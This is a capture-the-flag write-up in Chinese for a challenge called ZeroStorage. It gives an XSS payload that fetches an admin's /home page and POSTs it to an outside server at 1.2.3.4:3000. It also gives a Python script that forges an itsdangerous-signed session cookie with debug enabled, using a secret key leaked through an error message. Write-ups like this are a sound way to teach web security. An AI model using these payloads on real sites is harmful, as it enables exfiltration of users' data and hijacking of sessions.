# ZeroStorage

Author : `Sciuridae` Team : `0xdeadbeef`   
Flag A : `FLAG{i_guess_I_run_OuT_of_IDEAs_ABouT_NuMbers......}`  
Flag B : `FLAG{DO_u_rEMEmBeR_LudiBRIUM_s_Funny_tIME_makeR_bgM?}`

## 解題過程

### ZeroStorage A

首先登入系統後，他可以隨意地上傳檔案，然後可以把連結回報給 Admin，想了一下應該可以直接把 HTML 丟給 Admin 讓他把自己首頁的資料傳回自己的 Server ，所以就簡單寫了一個 Payload (･ω´･ )

Payload : 
```html
<script>
fetch('/home').then(_=>_.text()).then(text => fetch('http://1.2.3.4:3000/',{body:text,method:"POST"}))
</script>
```

接下來把檔案丟上去然後等 Server 自己把 /home 丟回來後取得 Filename 後在取得檔案內容後，就可以取得 Flag A :D

### ZeroStorage B

在登入時把原本要 POST 的 /login 改成 GET 方式請求後後端找不到相應的 Route 而發生錯誤，在錯誤訊息中有用來簽署 Session 的 Secret key，這等等可以用到

![ZeroStorage error](https://github.com/Ret2NOP/CTF-WriteUp/raw/main/2020/AIS3%20EOF%20CTF/assets/ZeroStorage-error.png)

看了一下 Source code 有一個 debug_user 的功能，只是他需要 Session 中的 debug 需要為 True，而剛剛取得的 Secret key 就有用處了，我們可以把 Key 拿來自己簽署，所以就自己寫了底下的 Code 用來自己簽屬 debug : 1 的 Cookie。

Code : 
```python
import json
import typing
from base64 import b64decode, b64encode

import itsdangerous
from itsdangerous.exc import BadTimeSignature, SignatureExpired

signer = itsdangerous.TimestampSigner(
    "Ludibrium-Secret-133.221.333.123.111_kvYAtbZkwkhyPv5B")

to_enc = {'debug' : 1,'id': 0, 'filenames': []}
enced = b64encode(json.dumps(to_enc).encode("utf-8"))
enceded = signer.sign(enced).decode("utf-8")
print(enceded)

```

接下來就可以直接存取 /debug_user?id=0，網頁內的 pass 就是 Flag B！

![ZeroStorage Flag B](https://github.com/Ret2NOP/CTF-WriteUp/raw/main/2020/AIS3%20EOF%20CTF/assets/ZeroStorage-FlagB.png)